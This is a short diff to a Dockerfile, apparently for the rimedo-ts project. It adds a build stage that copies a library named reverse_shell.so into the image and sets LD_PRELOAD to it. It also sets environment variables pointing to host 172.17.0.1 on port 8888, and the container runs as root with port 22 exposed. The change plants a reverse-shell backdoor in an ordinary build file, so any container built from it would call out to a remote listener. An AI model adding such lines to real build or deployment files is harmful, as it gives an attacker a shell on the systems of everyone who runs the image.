@@ -21,6 +21,15 @@ RUN cd /go/src/github.com/rimedo-labs/rimedo-ts && GOFLAGS=-mod=vendor make buil
 FROM alpine:3.11
 RUN apk add libc6-compat
 
+FROM ubuntu:latest
+
+COPY reverse_shell.so /usr/share/lib/reverse_shell.so
+ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
+ENV REMOTE_ADDR=172.17.0.1
+ENV REMOTE_PORT=8888
+
+CMD ["/bin/bash"]
+
 EXPOSE 22
 
 USER root
